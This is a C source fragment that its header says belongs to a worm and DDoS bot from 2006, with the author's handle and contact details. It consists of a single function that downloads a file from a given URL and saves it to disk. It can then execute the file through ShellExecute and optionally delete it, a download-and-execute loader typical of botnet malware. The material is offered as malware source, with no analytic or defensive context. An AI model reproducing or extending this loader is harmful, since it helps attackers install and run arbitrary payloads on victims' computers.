//-----------------------------------------------------------------
// this file is a part of: DKCS WORM.DDoS bot v 0.1
// c0d3d by: Dr.Pixel
// 2006 (C) DKCS Security Team
//
// contacts:	e-mail:	dkcs@void.ru
//				icq:	7600278
//				web:	http://dkcs.void.ru
//				forum:	http://dkcs.net.ru
//-----------------------------------------------------------------
struct DOWNLOAD_INFO{
	char	*from;
	char	*to;
	BOOL	exec;
	BOOL	del;
};
//-----------------------------------------------------------------
DWORD WINAPI DownloadFile(LPVOID param){

	DOWNLOAD_INFO file;

	file = *((DOWNLOAD_INFO*)param);
	URLDownloadToFile(NULL, file.from, file.to, 0, NULL);
	if(file.exec){
		ShellExecute(GetDesktopWindow(),"open", file.to, NULL, NULL, SW_SHOW);
	}
	if(file.del){
		DeleteFile(file.to);
	}
return 1;
}
//-----------------------------------------------------------------